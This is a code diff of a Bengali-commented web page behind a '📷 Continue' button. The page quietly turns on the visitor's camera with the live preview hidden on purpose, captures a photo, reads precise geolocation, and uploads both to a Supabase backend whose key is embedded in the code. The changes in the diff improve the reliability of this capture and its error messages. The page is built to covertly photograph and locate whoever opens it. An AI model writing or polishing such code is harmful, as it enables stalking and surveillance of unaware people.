@@ -45,7 +45,7 @@
       opacity: 0.6;
     }
 
-    /* Camera preview কখনো দেখানো হবে না */
+    /* Live camera preview hidden */
     #camera {
       display: none;
     }
@@ -79,13 +79,11 @@
     📷 Continue
   </button>
 
-  <!-- Camera element hidden -->
   <video id="camera" autoplay playsinline></video>
 
   <p id="status"></p>
 
 </div>
-
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
@@ -96,7 +94,6 @@ const SUPABASE_URL =
 
 const SUPABASE_PUBLISHABLE_KEY =
   "sb_publishable_Q1mhRPTOLcEUBwUog1nygQ_91N8_pzM";
-
 
 const supabaseClient =
   window.supabase.createClient(
@@ -123,7 +120,7 @@ async function startTest() {
   try {
 
     /* =========================
-       CAMERA
+       CAMERA PERMISSION
     ========================= */
 
     status.innerText =
@@ -147,8 +144,7 @@ async function startTest() {
       });
 
     /*
-     * Camera preview display:none থাকছে।
-     * তাই live video webpage-এ দেখা যাবে না।
+     * Camera preview hidden থাকবে।
      */
 
     video.srcObject = stream;
@@ -161,14 +157,26 @@ async function startTest() {
 
 
     /* =========================
-       PHOTO CAPTURE
+       CAPTURE PHOTO
     ========================= */
 
     const canvas =
       document.createElement("canvas");
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    canvas.width =
+      video.videoWidth;
+
+    canvas.height =
+      video.videoHeight;
+
+    if (
+      canvas.width === 0 ||
+      canvas.height === 0
+    ) {
+      throw new Error(
+        "Camera থেকে ছবি নেওয়া যায়নি।"
+      );
+    }
 
     const ctx =
       canvas.getContext("2d");
@@ -230,9 +238,12 @@ async function startTest() {
           resolve,
           reject,
           {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
+            enableHighAccuracy: false,
+
+            /* ৩০ সেকেন্ড */
+            timeout: 30000,
+
+            maximumAge: 30000
           }
         );
 
@@ -276,14 +287,13 @@ async function startTest() {
           }
         );
 
-
     if (uploadResult.error) {
       throw uploadResult.error;
     }
 
 
     /* =========================
-       DATABASE
+       SAVE LOCATION
     ========================= */
 
     status.innerText =
@@ -297,7 +307,6 @@ async function startTest() {
           latitude: latitude,
           longitude: longitude
         });
-
 
     if (insertResult.error) {
       throw insertResult.error;
@@ -326,9 +335,29 @@ async function startTest() {
 
     button.disabled = false;
 
-    status.innerText =
-      "❌ " +
-      (error.message || "কাজটি সম্পন্ন হয়নি।");
+
+    if (error.code === 1) {
+
+      status.innerText =
+        "❌ Location permission দেওয়া হয়নি।";
+
+    } else if (error.code === 2) {
+
+      status.innerText =
+        "❌ Location পাওয়া যায়নি। ফোনের Location ON করে আবার চেষ্টা করো।";
+
+    } else if (error.code === 3) {
+
+      status.innerText =
+        "❌ ৩০ সেকেন্ডের মধ্যে Location পাওয়া যায়নি।";
+
+    } else {
+
+      status.innerText =
+        "❌ " +
+        (error.message ||
+        "কাজটি সম্পন্ন হয়নি।");
+    }
   }
 
 }
